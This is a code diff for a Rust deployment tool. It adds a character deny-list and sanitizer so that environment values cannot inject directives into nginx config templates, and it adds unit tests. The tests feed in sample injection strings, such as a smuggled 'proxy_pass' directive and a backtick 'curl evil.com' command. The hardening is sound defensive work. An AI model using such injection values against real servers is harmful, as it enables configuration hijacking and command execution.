@@ -9,6 +9,38 @@ use std::path::Path;
 
 use crate::util::echo;
 
+/// Characters that could inject nginx directives when placed inside config values.
+const NGINX_DANGEROUS_CHARS: &[char] = &[';', '{', '}', '\n', '\r', '`', '$', '\\', '"', '\''];
+
+/// Sanitize a value destined for an nginx config template.
+/// Rejects values containing characters that could inject nginx directives.
+fn sanitize_nginx_value(key: &str, value: &str) -> Result<String> {
+    if value.chars().any(|c| NGINX_DANGEROUS_CHARS.contains(&c)) {
+        return Err(anyhow::anyhow!(
+            "Rejecting unsafe nginx config value for '{}': contains dangerous characters",
+            key,
+        ));
+    }
+    Ok(value.to_string())
+}
+
+/// Sanitize all environment variables before inserting into nginx template context.
+/// Returns a new HashMap with validated values. Logs warnings for rejected values.
+fn sanitize_env_for_nginx(env: &HashMap<String, String>) -> HashMap<String, String> {
+    let mut sanitized = HashMap::new();
+    for (key, value) in env {
+        match sanitize_nginx_value(key, value) {
+            Ok(clean) => {
+                sanitized.insert(key.clone(), clean);
+            }
+            Err(e) => {
+                echo(&format!("WARNING: {}", e), "yellow");
+            }
+        }
+    }
+    sanitized
+}
+
 /// Generate nginx configuration for an app.
 /// Checks for custom nginx config first, otherwise generates from template.
 pub fn generate_nginx_config(
@@ -114,6 +146,9 @@ fn generate_nginx_config_from_template(
         tera.add_raw_template(name, content)?;
     }
 
+    // Sanitize environment variables before inserting into nginx templates
+    let env = &sanitize_env_for_nginx(env);
+
     // Prepare context for template rendering
     let mut context = tera::Context::new();
 
@@ -121,7 +156,7 @@ fn generate_nginx_config_from_template(
     context.insert("APP", app);
     context.insert("INTERNAL_NGINX_APP_ROOT", &app_path.to_string_lossy());
 
-    // Pass all environment variables to the template
+    // Pass sanitized environment variables to the template
     for (key, value) in env {
         context.insert(key, value);
     }
@@ -394,6 +429,45 @@ mod tests {
     use super::*;
     use std::collections::HashMap;
     use tempfile::TempDir;
+
+    #[test]
+    fn test_sanitize_nginx_value_rejects_semicolons() {
+        assert!(sanitize_nginx_value("NGINX_SERVER_NAME", "example.com; proxy_pass http://evil").is_err());
+    }
+
+    #[test]
+    fn test_sanitize_nginx_value_rejects_braces() {
+        assert!(sanitize_nginx_value("NGINX_SERVER_NAME", "example.com { evil }").is_err());
+    }
+
+    #[test]
+    fn test_sanitize_nginx_value_rejects_newlines() {
+        assert!(sanitize_nginx_value("NGINX_SERVER_NAME", "example.com\nproxy_pass evil").is_err());
+    }
+
+    #[test]
+    fn test_sanitize_nginx_value_rejects_backticks() {
+        assert!(sanitize_nginx_value("PORT", "`curl evil.com`").is_err());
+    }
+
+    #[test]
+    fn test_sanitize_nginx_value_allows_clean_values() {
+        assert!(sanitize_nginx_value("NGINX_SERVER_NAME", "example.com").is_ok());
+        assert!(sanitize_nginx_value("PORT", "8080").is_ok());
+        assert!(sanitize_nginx_value("BIND_ADDRESS", "127.0.0.1").is_ok());
+        assert!(sanitize_nginx_value("NGINX_IPV6_ADDRESS", "[::]").is_ok());
+    }
+
+    #[test]
+    fn test_sanitize_env_for_nginx_filters_dangerous() {
+        let mut env = HashMap::new();
+        env.insert("GOOD_KEY".to_string(), "clean-value".to_string());
+        env.insert("BAD_KEY".to_string(), "value; inject".to_string());
+
+        let sanitized = sanitize_env_for_nginx(&env);
+        assert!(sanitized.contains_key("GOOD_KEY"));
+        assert!(!sanitized.contains_key("BAD_KEY"));
+    }
 
     #[test]
     fn test_generate_nginx_config() {
